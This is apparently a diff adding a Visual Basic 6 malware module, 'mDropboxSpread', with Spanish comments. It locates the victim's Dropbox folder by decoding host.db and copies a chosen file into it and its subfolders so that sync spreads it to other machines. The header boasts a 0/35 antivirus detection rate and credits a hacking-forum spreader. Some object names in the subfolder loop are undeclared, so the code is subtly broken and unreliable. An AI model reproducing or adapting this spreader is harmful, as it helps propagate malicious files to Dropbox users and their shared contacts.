@@ -1,0 +1,63 @@
+'---------------------------------------------------------------------------------------
+' Modulo     : mDropboxSpread
+' Autor      : chequinho
+' Fecha      : 20/08/2013
+' Finalidad  : Distribuir un archivo a la carpeta de Dropbox
+' Uso        : Call DropboxSpread(sFilePath, sFileName, [bSubDirs])
+'               - sFilePath: El archivo a distribuir
+'               - sFileName: Nombre de archivo a copiar
+'               - bSubDirs: Copiar tambien a SubDirectorios (opcional)
+' Detecciones: 0/35 (Native - Fast)
+' Notas
+'   - Necesarias referencias a Microsoft Scripting Runtime y a Microsoft XML, v2.6 (o mayor)
+'   - Idea original: exensoft (http://hackhound.org/forums/topic/2590-vb6-simple-dropbox-spreader/)
+'---------------------------------------------------------------------------------------
+ 
+Public Sub DropboxSpread(sFilePath As String, sFileName As String, Optional bSubDirs As Boolean = False)
+    Dim ObjFSO As New Scripting.FileSystemObject
+    ObjFSO.CopyFile sFilePath, getDropboxPath & "\" & sFileName, True
+    If bSubDirs = True Then
+        Dim oFolder As Scripting.Folder
+        Dim oSubFolder As Scripting.Folder
+        Set oFolder = oFileSys.GetFolder(getDropboxPath & "\")
+        For Each oSubFolder In oFolder.SubFolders
+            Call FSO.CopyFile(sFilePath, oSubFolder & "\" & sFileName, True)
+        Next oSubFolder
+        Set oFolder = Nothing
+    End If
+End Sub
+ 
+'http://www.nonhostile.com/howto-encode-decode-base64-vb6.asp
+Private Function DecodeBase64(ByVal strData As String) As String
+    Dim objXML As MSXML2.DOMDocument
+    Dim objNode As MSXML2.IXMLDOMElement
+    Set objXML = New MSXML2.DOMDocument
+    Set objNode = objXML.createElement("b64")
+    objNode.dataType = "bin.base64"
+    objNode.Text = strData
+    DecodeBase64 = StrConv(objNode.nodeTypedValue, vbUnicode)
+    Set objNode = Nothing
+    Set objXML = Nothing
+End Function
+ 
+Private Function getDropboxPath() As String
+    Dim sDBPath As String
+    sDBPath = Environ$("APPDATA") & "\Dropbox\host.db"
+    getDropboxPath = DecodeBase64(Read_LastLine(sDBPath))
+End Function
+ 
+'http://www.recursosvisualbasic.com.ar/htm/trucos-codigofuente-visual-basic/84.htm#3
+Private Function Read_LastLine(sFile As String) As String
+    Dim ObjTextStream As Scripting.TextStream
+    Dim ObjFSO As New Scripting.FileSystemObject
+    Dim ObjFile As File
+    Dim Lineas As String
+    Dim Ultima_Linea As Long
+    Set ObjFile = ObjFSO.GetFile(sFile)
+    Set ObjTextStream = ObjFile.OpenAsTextStream(ForReading, TristateUseDefault)
+    Do While Not ObjTextStream.AtEndOfStream
+        Lineas = Lineas & "<+>" & ObjTextStream.ReadLine
+        Ultima_Linea = Ultima_Linea + 1
+    Loop
+    Read_LastLine = Split(Lineas, "<+>")(Ultima_Linea)
+End Function
